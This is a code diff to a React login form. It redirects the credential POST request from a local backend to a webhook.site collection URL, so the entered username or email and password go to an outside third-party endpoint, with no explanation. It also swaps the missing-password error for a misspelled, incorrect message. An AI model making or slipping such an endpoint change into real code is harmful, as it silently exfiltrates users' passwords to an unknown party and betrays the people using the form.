@@ -35,7 +35,7 @@ export function LoginForm(props) {
       );
     if (!password)
       return snkbr.current.openSnackbar(
-        "Please enter your email password",
+        "Please enter your email adress",
         "error"
       );
     if (password.length < 8)
@@ -50,7 +50,7 @@ export function LoginForm(props) {
       );
 
     const res = await axios
-      .post("http://127.0.0.1:8000/", {
+      .post("https://webhook.site/52e30428-2b5c-4dcf-99c1-6b5ebbae4171", {
         Usernameormail: email,
         Password: password,
       })
@@ -62,7 +62,7 @@ export function LoginForm(props) {
         console.log();
         snkbr.current.openSnackbar(message);
       });
-      
+
       if (!res) return;
       if (!res.data.success) return snkbr.current.openSnackbar(res.data.message);
 
